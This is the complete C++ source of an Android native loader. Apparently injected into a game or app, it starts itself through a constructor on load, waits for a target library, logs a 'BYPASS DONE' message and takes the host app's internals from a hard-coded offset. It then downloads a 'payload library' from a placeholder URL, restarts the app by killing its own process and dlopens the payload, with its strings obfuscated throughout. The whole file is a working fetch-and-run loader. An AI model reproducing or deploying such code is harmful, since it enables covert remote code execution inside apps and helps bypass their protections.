#include <list>
#include <vector>
#include <string>
#include <cstring>
#include <memory.h>
#include <array>
#include <iterator>
#include <stdexcept>
#include <sstream>
#include <stddef.h>
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <dlfcn.h>
#include <sys/stat.h>
#include <jni.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <android/log.h>

#include "Includes/Tools.h"
#include "Includes/obfuscate.h"
#include "Includes/oxorany.h"
#include "Includes/Logger.h"
#include "Includes/fake_dlfcn.h"
#include "Includes/android_native_app_glue.h"
#include "Includes/XorStr.hpp"
#define SLEEP_TIME 1000LL / 60LL


uintptr_t TEST4;

#define GNativeAndroidApp_Offset 0xdb6df80

android_app *g_App = nullptr;
bool safe = false;

#define _BYTE  uint8_t
#define _WORD  uint16_t
#define _DWORD uint32_t
#define _QWORD uint64_t

// ---------- ScopedAttach ----------
class ScopedAttach {
    JavaVM* vm_{ nullptr };
    bool attached_{ false };
public:
    JNIEnv* env { nullptr };

    ScopedAttach() {
        if (!g_App) {
            //LOGE("ScopedAttach: g_App == nullptr!");
            return;
        }
        if (!g_App->activity) {
            //LOGE("ScopedAttach: g_App->activity == nullptr!");
            return;
        }
        vm_ = g_App->activity->vm;
        if (!vm_) {
            //LOGE("ScopedAttach: JavaVM pointer null in g_App->activity->vm!");
            return;
        }

        jint res = vm_->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6);
        if (res == JNI_OK) {
            //LOGD("ScopedAttach: Thread already attached to JVM.");
        } else {
            if (vm_->AttachCurrentThread(&env, nullptr) == JNI_OK) {
                attached_ = true;
                //LOGD("ScopedAttach: Attached current thread to JVM.");
            } else {
                //LOGE("ScopedAttach: Failed to attach current thread to JVM!");
            }
        }
    }

    ~ScopedAttach() {
        if (attached_ && vm_) {
            vm_->DetachCurrentThread();
            //LOGD("ScopedAttach: Detached current thread.");
        }
    }

    bool valid() const {
        if (!env) //LOGE("ScopedAttach: env == nullptr (not valid)");
        return env != nullptr;
    }
};

// ---------- JNI helpers----------
jclass _findClass_internal(JNIEnv* e, const char* name)
{
    if (!e || !name) return nullptr;
    return e->FindClass(name);
}

jmethodID _getMethod_internal(JNIEnv* e, jclass c, const char* name, const char* sig, bool isStatic = false)
{
    if (!e || !c || !name || !sig) return nullptr;
    jmethodID id = isStatic ? e->GetStaticMethodID(c, name, sig) : e->GetMethodID(c, name, sig);
    return id;
}

#define _getMethod4(env, clazz, name, sig) \
    _getMethod_internal(env, clazz, name, sig, false)

#define _getMethod5(env, clazz, name, sig, isStatic) \
    _getMethod_internal(env, clazz, name, sig, isStatic)

#define _GET_METHOD_MACRO(_1,_2,_3,_4,_5, NAME, ...) NAME
#define getMethod(...) _GET_METHOD_MACRO(__VA_ARGS__, _getMethod5, _getMethod4)(__VA_ARGS__)

#define findClass(env, name) _findClass_internal(env, name)

// ---------- File utilities ----------
bool fileExists(const std::string& path) {
    struct stat st;
    return stat(path.c_str(), &st) == 0;
}

std::string readFile(const std::string& path) {
    std::ifstream f(path);
    if (!f.is_open()) return "";
    std::stringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

static std::string trim(const std::string &s) {
    size_t a = s.find_first_not_of(" \r\n\t");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \r\n\t");
    return s.substr(a, b - a + 1);
}

// ---------- DownloadAndSave ----------
void DownloadAndSave(const std::string& url, const std::string& path)
{
    ScopedAttach sa;
    if (!sa.valid()) return;

    JNIEnv* e = sa.env;
    constexpr int retryDelayMs = 3000;

    jclass urlCls = findClass(e, "java/net/URL");
    jclass ucCls = findClass(e, "java/net/URLConnection");
    jclass isCls = findClass(e, "java/io/InputStream");
    jclass fosCls = findClass(e, "java/io/FileOutputStream");
    jmethodID urlCtor = getMethod(e, urlCls, "<init>", "(Ljava/lang/String;)V");
    jmethodID openConn = getMethod(e, urlCls, "openConnection", "()Ljava/net/URLConnection;");
    jmethodID getStream = getMethod(e, ucCls, "getInputStream", "()Ljava/io/InputStream;");
    jmethodID is_read = getMethod(e, isCls, "read", "([B)I");
    jmethodID fosCtor = getMethod(e, fosCls, "<init>", "(Ljava/lang/String;)V");
    jmethodID fos_write = getMethod(e, fosCls, "write", "([BII)V");

    while (true)
    {
        jthrowable ex = nullptr;
        bool success = false;

        jobject urlObj = nullptr, conn = nullptr, is = nullptr, fos = nullptr;
        jbyteArray buf = nullptr;
        jstring jUrl = nullptr;
        jstring jPath = nullptr;

        do {
            jUrl = e->NewStringUTF(url.c_str());
            if (!jUrl) break;
            urlObj = e->NewObject(urlCls, urlCtor, jUrl);
            if ((ex = e->ExceptionOccurred())) break;
            e->DeleteLocalRef(jUrl); jUrl = nullptr;

            conn = e->CallObjectMethod(urlObj, openConn);
            if ((ex = e->ExceptionOccurred())) break;

            is = e->CallObjectMethod(conn, getStream);
            if ((ex = e->ExceptionOccurred())) break;

            jPath = e->NewStringUTF(path.c_str());
            if (!jPath) break;
            fos = e->NewObject(fosCls, fosCtor, jPath);
            if ((ex = e->ExceptionOccurred())) break;
            e->DeleteLocalRef(jPath); jPath = nullptr;

            buf = e->NewByteArray(4096);
            if (!buf) break;

            while (true) {
                jint n = e->CallIntMethod(is, is_read, buf);
                if ((ex = e->ExceptionOccurred())) break;
                if (n == -1) break;

                e->CallVoidMethod(fos, fos_write, buf, 0, n);
                if ((ex = e->ExceptionOccurred())) break;
            }

            success = true;

        } while (false);

        if (buf)     e->DeleteLocalRef(buf);
        if (fos)     e->DeleteLocalRef(fos);
        if (is)      e->DeleteLocalRef(is);
        if (conn)    e->DeleteLocalRef(conn);
        if (urlObj)  e->DeleteLocalRef(urlObj);
        if (jUrl)    e->DeleteLocalRef(jUrl);
        if (jPath)   e->DeleteLocalRef(jPath);

        if (e->ExceptionCheck()) {
            e->ExceptionClear();
        }

        if (success) break;

        std::this_thread::sleep_for(std::chrono::milliseconds(retryDelayMs));
    }
}

std::string getAppFilesPath()
{
    ScopedAttach sa;
    if (!sa.valid()) {
        //LOGE("getAppFilesPath: ScopedAttach invalid, aborting.");
        return "";
    }

    JNIEnv* e = sa.env;
    constexpr int retryDelayMs = 3000;
    std::string result;

    jclass clsActivityThread = findClass(e, "android/app/ActivityThread");
    if (!clsActivityThread) {
        //LOGE("getAppFilesPath: Failed to find ActivityThread class!");
        return "";
    }

    jmethodID midCurrentApp = getMethod(e, clsActivityThread, "currentApplication",
                                        "()Landroid/app/Application;", true);
    if (!midCurrentApp) {
        //LOGE("getAppFilesPath: Failed to get currentApplication() method!");
        return "";
    }

    jclass clsApp = nullptr;
    jmethodID midGetFilesDir = nullptr, midGetPath = nullptr;
    jobject app = nullptr, fileObj = nullptr;
    jstring pathStr = nullptr;
    jthrowable ex = nullptr;

    int attempt = 0;

    while (true)
    {
        attempt++;
        bool success = false;
        //LOGD("getAppFilesPath: Attempt %d...", attempt);

        do {
            app = e->CallStaticObjectMethod(clsActivityThread, midCurrentApp);
            if ((ex = e->ExceptionOccurred()) || !app) {
                //LOGE("getAppFilesPath: currentApplication() returned null.");
                break;
            }
            //LOGD("getAppFilesPath: Got Application object.");

            clsApp = e->GetObjectClass(app);
            if (!clsApp) {
                //LOGE("getAppFilesPath: clsApp null!");
                break;
            }

            midGetFilesDir = e->GetMethodID(clsApp, "getFilesDir", "()Ljava/io/File;");
            if (!midGetFilesDir) {
                //LOGE("getAppFilesPath: getFilesDir() method not found!");
                break;
            }

            fileObj = e->CallObjectMethod(app, midGetFilesDir);
            if ((ex = e->ExceptionOccurred()) || !fileObj) {
                //LOGE("getAppFilesPath: getFilesDir() returned null!");
                break;
            }
            //LOGD("getAppFilesPath: Got File object for FilesDir.");

            jclass clsFileObj = e->GetObjectClass(fileObj);
            if (!clsFileObj) {
                //LOGE("getAppFilesPath: clsFileObj null!");
                break;
            }

            midGetPath = e->GetMethodID(clsFileObj, "getAbsolutePath", "()Ljava/lang/String;");
            if (!midGetPath) {
                //LOGE("getAppFilesPath: getAbsolutePath() not found!");
                e->DeleteLocalRef(clsFileObj);
                break;
            }

            pathStr = (jstring)e->CallObjectMethod(fileObj, midGetPath);
            if ((ex = e->ExceptionOccurred()) || !pathStr) {
                //LOGE("getAppFilesPath: getAbsolutePath() returned null!");
                e->DeleteLocalRef(clsFileObj);
                break;
            }

            const char* cpath = e->GetStringUTFChars(pathStr, nullptr);
            result = cpath;
            e->ReleaseStringUTFChars(pathStr, cpath);
            e->DeleteLocalRef(clsFileObj);

            //LOGI("getAppFilesPath: Result = %s", result.c_str());
            success = true;

        } while (false);

        if (pathStr)     { e->DeleteLocalRef(pathStr); pathStr = nullptr; }
        if (fileObj)     { e->DeleteLocalRef(fileObj); fileObj = nullptr; }
        if (clsApp)      { e->DeleteLocalRef(clsApp); clsApp = nullptr; }
        if (app)         { e->DeleteLocalRef(app); app = nullptr; }

        if (e->ExceptionCheck()) {
            //LOGE("getAppFilesPath: JNI Exception occurred! Clearing...");
            e->ExceptionClear();
        }

        if (success || !result.empty()) break;

        //LOGE("getAppFilesPath: Failed attempt %d, retrying in %dms...", attempt, retryDelayMs);
        std::this_thread::sleep_for(std::chrono::milliseconds(retryDelayMs));
        if (attempt >= 3) {
            //LOGE("getAppFilesPath: Giving up after 3 failed attempts.");
            break;
        }
    }

    if (result.empty()) {
        //LOGE("getAppFilesPath: Final result empty (FAILED).");
    } else {
        //LOGI("getAppFilesPath: Final path = %s", result.c_str());
    }

    return result;
}

// ---------- downloadText ----------
std::string downloadText(const std::string& url, const std::string& localTmp) {
    DownloadAndSave(url, localTmp);
    return readFile(localTmp);
}

// Checks if library is already loaded in process memory
static inline bool isLibraryLoadedFast(const char* libPath) {
    void* handle = dlopen(libPath, RTLD_NOW | RTLD_NOLOAD);
    bool loaded = (handle != nullptr);
    if (handle) dlclose(handle);
    LOGD(_enc("[check] %s -> %s"), libPath, loaded ? "already loaded" : "not loaded");
    return loaded;
}

// Loads the .so if not already loaded
static inline bool loadLibrary64(const std::string& path) {
    if (path.empty()) {
        LOGE(_enc("Invalid path (empty)"));
        return false;
    }

    if (isLibraryLoadedFast(path.c_str())) {
        LOGI(_enc("Library already loaded, skipping: %s"), path.c_str());
        return true;
    }

    void* handle = dlopen(path.c_str(), RTLD_NOW);
    if (!handle) {
        LOGE(_enc("dlopen failed for %s: %s"), path.c_str(), dlerror());
        return false;
    }

    LOGI(_enc("Successfully loaded: %s"), path.c_str());
    return true;
}

// ---------- RestartApp ----------
void RestartApp() {
    ScopedAttach sa;
    if (!sa.valid()) {
        LOGE(_enc("RestartApp: failed to attach to JVM"));
        return;
    }

    JNIEnv* e = sa.env;
    jclass clsActivityThread = findClass(e, "android/app/ActivityThread");
    if (!clsActivityThread) return;

    jmethodID midCurrentApp = getMethod(e, clsActivityThread, "currentApplication",
                                        "()Landroid/app/Application;", true);
    if (!midCurrentApp) return;

    jobject app = e->CallStaticObjectMethod(clsActivityThread, midCurrentApp);
    if (!app) return;

    jclass clsApp = e->GetObjectClass(app);
    jmethodID midGetCtx = e->GetMethodID(clsApp, "getApplicationContext", "()Landroid/content/Context;");
    jobject ctx = e->CallObjectMethod(app, midGetCtx);

    jclass clsCtx = e->GetObjectClass(ctx);
    jmethodID midPm = e->GetMethodID(clsCtx, "getPackageManager", "()Landroid/content/pm/PackageManager;");
    jobject pm = e->CallObjectMethod(ctx, midPm);

    jmethodID midPkg = e->GetMethodID(clsCtx, "getPackageName", "()Ljava/lang/String;");
    jstring pkg = (jstring)e->CallObjectMethod(ctx, midPkg);

    jclass clsPm = e->GetObjectClass(pm);
    jmethodID midLaunch = e->GetMethodID(clsPm, "getLaunchIntentForPackage",
                                         "(Ljava/lang/String;)Landroid/content/Intent;");
    jobject intent = e->CallObjectMethod(pm, midLaunch, pkg);

    if (intent) {
        jclass clsIntent = e->GetObjectClass(intent);
        jmethodID midAddFlag = e->GetMethodID(clsIntent, "addFlags", "(I)Landroid/content/Intent;");
        e->CallObjectMethod(intent, midAddFlag, 0x10000000); //FLAG_ACTIVITY_NEW_TASK

        jmethodID midStart = e->GetMethodID(clsCtx, "startActivity",
                                            "(Landroid/content/Intent;)V");
        e->CallVoidMethod(ctx, midStart, intent);

        LOGI(_enc("RestartApp: launching new instance and killing current process..."));
        sleep(1);
        kill(getpid(), SIGKILL);
    } else {
        LOGE(_enc("RestartApp: Could not obtain launch intent for package"));
    }

    e->DeleteLocalRef(clsActivityThread);
    e->DeleteLocalRef(clsApp);
    e->DeleteLocalRef(clsCtx);
    e->DeleteLocalRef(clsPm);
    e->DeleteLocalRef(ctx);
    e->DeleteLocalRef(app);
}

void *load_thread(void *) {
    TEST4 = Tools::GetBaseAddress(oxorany("libtest.so"));
    while (!UE4) {
        TEST4 = Tools::GetBaseAddress(oxorany("libtest.so"));
        sleep(1);
    }

    LOGI(oxorany("BYPASS DONE"));

    while (!g_App) {
        g_App = *(android_app **) (TEST4 + GNativeAndroidApp_Offset);
        sleep(1);
    }

    
    // Provide download URLs (replace with your real URLs)
    
    const std::string libUrl     = _enc("https://url.com/libsag.so");
    const std::string verUrl     = _enc("https://url.com/version.txt");
    
    std::string filesDir = getAppFilesPath();
    if (filesDir.empty()) {
        LOGE(_enc("getAppFilesPath() failed, aborting loader thread."));
        return nullptr;
    }

    std::string localLib = filesDir + _enc("/libsag.so");
    std::string localVer = filesDir + _enc("/version.txt");
    std::string tempVer  = filesDir + _enc("/version_tmp.txt");

    bool needUpdate = false;
    std::string remoteVer, localVerStr;

    //read local version
    if (fileExists(localVer)) {
        localVerStr = readFile(localVer);
    }

    //download remote version to temp file
    remoteVer = downloadText(verUrl, tempVer);

    //validate remoteVer
    if (remoteVer.empty()) {
        LOGD(_enc("Remote version empty or failed to download; skipping update check."));
        //Still attempt to load existing lib if present
    } else {
        //Compare trimmed
        if (trim(remoteVer) != trim(localVerStr)) {
            LOGD(_enc("Version changed: local=[%s], remote=[%s]"), localVerStr.c_str(), remoteVer.c_str());
            needUpdate = true;
        } else {
            LOGD(_enc("Local library is up to date (v%s)"), localVerStr.c_str());
        }
    }

    //Download if missing or update required
    bool downloadedNow = false;

    if (!fileExists(localLib) || needUpdate) {
        LOGI(_enc("Update Check Triggered:"));
        if (!fileExists(localLib))
            LOGI(_enc("Local library not found -> starting initial download..."));
        else if (needUpdate)
            LOGI(_enc("Remote version differs -> starting update download..."));

        LOGI(_enc("Downloading libsag.so from: %s"), libUrl.c_str());
        DownloadAndSave(libUrl, localLib);

        //Check download success
        if (fileExists(localLib)) {
            LOGI(_enc("Download completed successfully: %s"), localLib.c_str());
            downloadedNow = true;

            //Save version info
            if (!remoteVer.empty()) {
                std::ofstream v(localVer, std::ios::trunc);
                if (v.is_open()) {
                    v << trim(remoteVer);
                    v.close();
                    LOGI(_enc("Saved new version string: [%s]"), trim(remoteVer).c_str());
                } else {
                    LOGE(_enc("Failed to open version file for writing: %s"), localVer.c_str());
                }
            } else {
                LOGW(_enc("Remote version string empty; skipping version.txt update."));
            }
        } else {
            LOGE(_enc("Download failed or file missing after save: %s"), localLib.c_str());
        }

        LOGI("------------------------------------------------------------");
    } else {
        LOGI(_enc("Library is up to date (v%s); no download needed."), localVerStr.c_str());
    }

    if (downloadedNow) {
        LOGI(_enc("Restarting app to apply new library update..."));
        RestartApp();
        LOGI(_enc("Current process exiting after restart trigger..."));
        return nullptr;
    }

    JavaVM* vm = nullptr;
    if (g_App && g_App->activity && g_App->activity->vm) vm = g_App->activity->vm;
    else LOGD(_enc("JavaVM pointer not available (vm==nullptr)"));

    if (!loadLibrary64(localLib)) {
        LOGE(_enc("Failed to load payload library: %s"), dlerror());
    }

    return nullptr;
}

__attribute__((constructor))
void _init() {
    pthread_t ptid;
    pthread_create(&ptid, nullptr, load_thread, nullptr);
}
